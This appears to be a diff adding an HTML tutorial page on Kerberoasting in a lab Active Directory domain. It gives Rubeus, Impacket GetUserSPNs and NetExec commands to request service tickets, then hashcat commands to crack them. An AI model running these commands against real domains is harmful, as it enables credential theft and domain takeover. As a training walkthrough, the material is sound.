@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kerberoasting</title>
+    <link rel="stylesheet" href="../styles.css"> <!-- Adjust the path as needed -->
+</head>
+<body>
+
+    <div class="content">
+        <h2>Kerberoasting with PowerShell</h2>
+        <p>Kerberoasting is when a Ticket Granting Service (TGS) ticket is requested for a service account.</p>
+        <p>The TGS ticket is encrypted with the sercvice account's NTLM hash, and can be subjected to an offline brute-force hash cracking attack.</p>
+        <p>We already have the tools needed to conduct this attack with Invoke-Rubeus and Rubeus:</p>
+        
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+#Using Rubeus
+.\rubeus.exe kerberoast /domain:maraudersec.local /nowrap
+#Using Invoke-Rubeus
+Invoke-Rubeus -Command 'kerberoast /nowrap /domain:maraudersec.local'
+                </pre>
+            </div>
+        </div>
+         <div class="image-container">
+             <img src="../images/KerberoastingRubeus.jpg" alt="Kerberoasting with Rubeus">
+         </div>    
+        <p>Now we can copy that hash back to ourselves and Hashcat or John the Ripper to hopefully crack the password.</p>
+        <p>As you can see below this time we used our own Windows machine to crack the hash with Hashcat instead of using the Kali machine. If you tried to crack the password it is not within the Rockyou.txt wordlist. However, utilzing rules with Hashcat such as OneRuleToRuleThemAll we can crack the password</p>
+
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>    
+.\hashcat.exe .\hash.txt .\rockyou.txt\rockyou.txt
+.\hashcat.exe .\hash.txt .\rockyou.txt\rockyou.txt -w3 -O -r .\rules\OneRuleToRuleThemAll.rule
+                </pre>
+            </div>
+        </div>                       
+         <div class="image-container">
+             <img src="../images/KerberosHashCracked.jpg" alt="Hash Cracked">
+         </div>     
+         <h2>Kerberoasting with Linux</h2>
+        <p>Now we can move over to Linux and utilizie the Impacket Toolkit or NetExec.</p>
+
+        <div class="kali-terminal-wrapper">
+            <div class="kali-terminal">
+                <div class="terminal-header">
+                    <span>Kali Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>          
+#See all Kerberoastable Accounts
+GetUserSPNs.py 'maraudersec.local/alice.wonderland:P@ssw0rd!'
+#Request only one user TGS
+GetUserSPNs.py 'maraudersec.local/alice.wonderland:P@ssw0rd!' -request-user mssql_service
+#Request all users TGS
+GetUserSPNs.py 'maraudersec.local/alice.wonderland:P@ssw0rd!' -request
+
+                </pre>
+            </div>
+        </div>
+        <div class="image-container">
+             <img src="../images/KerberoastingFromLinux.jpg" alt="Kerberoasting from Linux">
+         </div>       
+
+        <p>We can also use NetExec as stated above with LDAP and --kerberoasting. Notice below, we are saving the TGS to hash.txt</p>
+                
+        <div class="kali-terminal-wrapper">
+            <div class="kali-terminal">
+                <div class="terminal-header">
+                    <span>Kali Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+
+nxc ldap maraudersec.local -u 'alice.wonderland' -p 'P@ssw0rd!' --kerberoasting hash.txt
+
+                </pre>
+            </div>
+        </div>
+          <div class="image-container">
+             <img src="../images/KerberoastingNetExec.jpg" alt="Kerberoasting with NetExec">
+         </div>
+        <p>As shown above there are multiple ways to request a TGS, usually service accounts have higher permissions, and many times Domain Admin permissions within a Domain. Being able to request the TGS and then cracking those passwords greatly increases your ability for privilege escalation, or even domain takeover.</p>
+    <script>
+        function copyToClipboard() {
+            var terminalContent = document.querySelector('.kali-terminal pre').textContent;
+            var textArea = document.createElement('textarea');
+            textArea.value = terminalContent;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            alert("Copied to clipboard!");
+        }
+    </script>
+</body>
+</html>
